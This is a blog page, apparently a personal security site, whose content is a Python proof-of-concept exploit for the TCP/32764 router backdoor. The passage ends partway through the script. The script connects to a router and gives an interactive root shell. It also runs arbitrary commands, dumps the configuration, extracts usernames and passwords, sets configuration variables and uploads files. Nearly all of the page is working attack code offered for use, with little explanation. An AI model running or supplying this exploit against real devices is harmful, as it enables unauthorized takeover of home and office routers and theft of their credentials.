<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

      <title>@xjump</title>

      

      
          <script src="/slideout/1.0.1/slideout.min.js"></script>
          
          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css">

          <script defer src="/katex/0.10.1/katex.min.js" ></script>
          <script defer src="/katex/0.10.1/contrib/mathtex-script-type.min.js" ></script>
              
          <script defer src="/katex/0.10.1/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
              
          
      

      
          <link rel="stylesheet" href="https:&#x2F;&#x2F;xjump.me&#x2F;site.css">
          
          <link rel="stylesheet" href="/katex/0.10.1/katex.min.css"  >
          
      

      
      
    </head>

    <body>
        <div class="container">

            <div id="mobile-navbar" class="mobile-navbar">
              <div class="mobile-header-logo">
                <a href="/" class="logo">@xjump</a>
              </div>
              <div class="mobile-navbar-icon icon-out">
                <span></span>
                <span></span>
                <span></span>
              </div>
            </div>

            <nav id="mobile-menu" class="mobile-menu slideout-menu slideout-menu-left">
              <ul class="mobile-menu-list">
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me">
                            Home
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">
                            Categories
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">
                            Archive
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">
                            RSS
                        </a>
                    </li>
                
                    <li class="mobile-menu-item">
                        <a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">
                            About
                        </a>
                    </li>
                
              </ul>
            </nav>

            <header id="header">
                <div class="logo"><a href="https:&#x2F;&#x2F;xjump.me">@xjump</a></div>
                <nav class="menu">
                    <ul>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me">
                                    Home
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;categories">
                                    Categories
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all">
                                    Archive
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;rss.xml">
                                    RSS
                                </a>
                            </li>
                        
                            <li>
                                <a href="https:&#x2F;&#x2F;xjump.me&#x2F;about">
                                    About
                                </a>
                            </li>
                        
                    </ul>
                </nav>
            </header>

            <main>
                <div class="content" id="mobile-panel">
                    



<article class="post">
    
    <header class="post__header">
        <h1 class="post__title">
            <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tcp-32764-backdoor&#x2F;">TCP-32764 backdoor</a>
        </h1>
        <div class="post__meta">
            <span class="post__time">2013-01-07</span>
            
        </div>
    </header>

    <div class="post-content">
      <p>
    PoC:</p>
<pre style="background-color:#2b303b;">
<code class="language-python" data-lang="python"><span style="color:#65737e;">#!/usr/bin/env python</span><span style="color:#65737e;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">socket</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">struct</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">sys</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">argparse</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">re</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">&#39;&#39;&#39;</span><span style="color:#65737e;">
  ref: https://github.com/elvanderb/TCP-32764</span><span style="color:#65737e;">
&#39;&#39;&#39;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
parser = argparse.</span><span style="color:#bf616a;">ArgumentParser</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">description</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">PoC for the TCP/32764 backdoor.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&#39;\</span><span style="color:#c0c5ce;">
    &#39;</span><span style="color:#a3be8c;">see https://github.com/elvanderb/TCP-32764 for more details</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
parser.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--ip</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">=str, </span><span style="color:#bf616a;">nargs</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">routers IP</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">default</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">192.168.1.1</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
parser.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--port</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">=int, </span><span style="color:#bf616a;">nargs</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">port to use</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">default</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">32764</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
command_group = parser.</span><span style="color:#bf616a;">add_mutually_exclusive_group</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
command_group.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--is_vuln</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">tells you if the router is vulnerable or not (default)</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">action</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">store_true</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
command_group.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--shell</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">gives you a root shell on the router</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">action</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">store_true</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
command_group.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--execute</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">=str, </span><span style="color:#bf616a;">nargs</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">run a command and dump straight to stdout</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">default</span><span style="color:#c0c5ce;">=&#39;&#39;)</span><span style="color:#c0c5ce;">
command_group.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--print_conf</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">pretty print router</span><span style="color:#96b5b4;">\&#39;</span><span style="color:#a3be8c;">s configuration</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">action</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">store_true</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
command_group.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--get_credentials</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">gets credentials</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">action</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">store_true</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
command_group.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--get_var</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">=str, </span><span style="color:#bf616a;">nargs</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">metavar</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">var_name</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">get router</span><span style="color:#96b5b4;">\&#39;</span><span style="color:#a3be8c;">s configuration variable</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
command_group.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--set_var</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">=str, </span><span style="color:#bf616a;">nargs</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">metavar</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">var_name=val</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">set router</span><span style="color:#96b5b4;">\&#39;</span><span style="color:#a3be8c;">s configuration variable</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
command_group.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--message</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">=int, </span><span style="color:#bf616a;">nargs</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">message to send</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">choices</span><span style="color:#c0c5ce;">=</span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">14</span><span style="color:#c0c5ce;">))</span><span style="color:#c0c5ce;">
command_group.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--send_file</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">=str, </span><span style="color:#bf616a;">nargs</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">file to send</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
command_group.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--send_file2</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">=str, </span><span style="color:#bf616a;">nargs</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">file to send, using echo -n -e</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
parser.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--payload</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">=str, </span><span style="color:#bf616a;">nargs</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">message</span><span style="color:#96b5b4;">\&#39;</span><span style="color:#a3be8c;">s payload</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">default</span><span style="color:#c0c5ce;">=&#39;&#39;)</span><span style="color:#c0c5ce;">
parser.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--timeout</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">=int, </span><span style="color:#bf616a;">nargs</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">connexion timeout in seconds</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">default</span><span style="color:#c0c5ce;">=</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
parser.</span><span style="color:#bf616a;">add_argument</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">--remote-filename</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">=str, </span><span style="color:#bf616a;">nargs</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">?</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">help</span><span style="color:#c0c5ce;">=&#39;</span><span style="color:#a3be8c;">remote filename in /tmp when copying</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#bf616a;">default</span><span style="color:#c0c5ce;">=&quot;</span><span style="color:#a3be8c;">upload</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
args = parser.</span><span style="color:#bf616a;">parse_args</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">send_message</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">s</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">endianness</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">message</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">payload</span><span style="color:#c0c5ce;">=&#39;&#39;):</span><span style="color:#c0c5ce;">
    header = struct.</span><span style="color:#bf616a;">pack</span><span style="color:#c0c5ce;">(endianness + &#39;</span><span style="color:#a3be8c;">III</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">0x53634D4D</span><span style="color:#c0c5ce;">, message, </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(payload)+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
    s.</span><span style="color:#bf616a;">send</span><span style="color:#c0c5ce;">(header+payload+&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
    r = s.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0xC</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">while </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(r) &lt; </span><span style="color:#d08770;">0xC</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
        tmp = s.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0xC </span><span style="color:#c0c5ce;">- </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(r))</span><span style="color:#c0c5ce;">
        </span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(tmp) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
        r += tmp</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
    sig, ret_val, ret_len = struct.</span><span style="color:#bf616a;">unpack</span><span style="color:#c0c5ce;">(endianness + &#39;</span><span style="color:#a3be8c;">III</span><span style="color:#c0c5ce;">&#39;, r)</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">assert</span><span style="color:#c0c5ce;">(sig == </span><span style="color:#d08770;">0x53634D4D</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">ret_val != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
        </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">ret_val, &quot;</span><span style="color:#a3be8c;">ERROR</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
    ret_str = &quot;&quot;</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">while </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(ret_str) &lt; ret_len:</span><span style="color:#c0c5ce;">
        tmp = s.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">(ret_len - </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(ret_str))</span><span style="color:#c0c5ce;">
        </span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(tmp) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
        ret_str += tmp</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">ret_val, ret_str</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;"># Big endian or little endian ?</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">s = socket.</span><span style="color:#bf616a;">socket</span><span style="color:#c0c5ce;">(socket.</span><span style="color:#bf616a;">AF_INET</span><span style="color:#c0c5ce;">, socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
s.</span><span style="color:#bf616a;">settimeout</span><span style="color:#c0c5ce;">(args.timeout)</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">try </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
    s.</span><span style="color:#bf616a;">connect</span><span style="color:#c0c5ce;">((args.ip, args.port))</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">except </span><span style="color:#c0c5ce;">socket.error </span><span style="color:#b48ead;">as </span><span style="color:#c0c5ce;">v:</span><span style="color:#c0c5ce;">
    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">probably not vulnerable (error: </span><span style="color:#d08770;">{0:s}</span><span style="color:#a3be8c;">)</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(v))</span><span style="color:#c0c5ce;">
    sys.</span><span style="color:#bf616a;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
s.</span><span style="color:#bf616a;">send</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">blablablabla</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
r = s.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0xC</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">while </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(r) &lt; </span><span style="color:#d08770;">0xC</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
    tmp = s.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0xC </span><span style="color:#c0c5ce;">- </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(r))</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(tmp) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">
    r += tmp</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
sig, ret_val, ret_len = struct.</span><span style="color:#bf616a;">unpack</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">&lt;III</span><span style="color:#c0c5ce;">&#39;, r)</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">sig == </span><span style="color:#d08770;">0x53634D4D </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
    endianness = &quot;</span><span style="color:#a3be8c;">&lt;</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">sig == </span><span style="color:#d08770;">0x4D4D6353 </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
    endianness = &quot;</span><span style="color:#a3be8c;">&gt;</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">probably not vulnerable</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
    sys.</span><span style="color:#bf616a;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
s.</span><span style="color:#bf616a;">close</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
s = socket.</span><span style="color:#bf616a;">socket</span><span style="color:#c0c5ce;">(socket.</span><span style="color:#bf616a;">AF_INET</span><span style="color:#c0c5ce;">, socket.</span><span style="color:#bf616a;">SOCK_STREAM</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
s.</span><span style="color:#bf616a;">settimeout</span><span style="color:#c0c5ce;">(args.timeout)</span><span style="color:#c0c5ce;">
s.</span><span style="color:#bf616a;">connect</span><span style="color:#c0c5ce;">((args.ip, args.port))</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">args.is_vuln :</span><span style="color:#c0c5ce;">
    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">{0:s}</span><span style="color:#a3be8c;">:</span><span style="color:#d08770;">{1:d}</span><span style="color:#a3be8c;"> is vulnerable!</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(args.ip, args.port))</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">args.shell :</span><span style="color:#c0c5ce;">
    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">echo &quot;welcome, here is a root shell, have fun&quot;</span><span style="color:#c0c5ce;">&#39;)[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">])</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">while </span><span style="color:#d08770;">1 </span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
        </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, sys.stdin.</span><span style="color:#bf616a;">readline</span><span style="color:#c0c5ce;">().</span><span style="color:#bf616a;">strip</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&#39;))[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">])</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">elif </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(args.execute) :</span><span style="color:#c0c5ce;">
    sys.stdout.</span><span style="color:#bf616a;">write</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">, args.execute)[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">])</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">args.print_conf :</span><span style="color:#c0c5ce;">
    conf = </span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
    conf = conf.</span><span style="color:#bf616a;">replace</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
    conf = conf.</span><span style="color:#bf616a;">replace</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\x01</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#96b5b4;">\n\t</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
    </span><span style="color:#96b5b4;">print</span><span style="color:#c0c5ce;">(conf)</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">elif </span><span style="color:#c0c5ce;">args.get_credentials :</span><span style="color:#c0c5ce;">
    conf = </span><span style="color:#bf616a;">send_message</span><span style="color:#c0c5ce;">(s, endianness, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
    lines = re.</span><span style="color:#bf616a;">split</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\x00</span><span style="color:#a3be8c;">|</span><span style="color:#96b5b4;">\x01</span><span style="color:#c0c5ce;">&quot;, conf)</span><span style="color:#c0c5ce;">
    pattern = re.</span><span style="color:#bf616a;">compile</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">user(name)?|password|login</span><span style="color:#c0c5ce;">&#39;);</span><span style="color:#c0c5ce;">
    credentials = []</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">line </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">lines:</span><span style="color:#c0c5ce;">
        </span><span style="color:#b48ead;">try</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
            (var, value) = line.</span><span style="color:#bf616a;">split</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">=</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
            </span><span style="color:#b48ead;">if </span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(value)&gt;</span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">and pattern.</span><span style="color:#bf616a;">search</span><span style="color:#c0c5ce;">(var):</span><span style="color:#c0c5ce;">
                credentials += [[var, value]]</span><span style="color:#c0c5ce;">
        </span><span style="color:#b48ead;">except </span><span style="color:#c0c5ce;">ValueError:</span><span style="color:#c0c5ce;">
            </span><span style="color:#b48ead;">pass</span><span style="color:#c0c5ce;">
    credentials.</span><span style="color:#bf616a;">sort</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">var, value </span><span style="color:#b48ead;">in </span><span style="color:#c0c5ce;">credentials:</span><span style="color:#c0c5ce;">
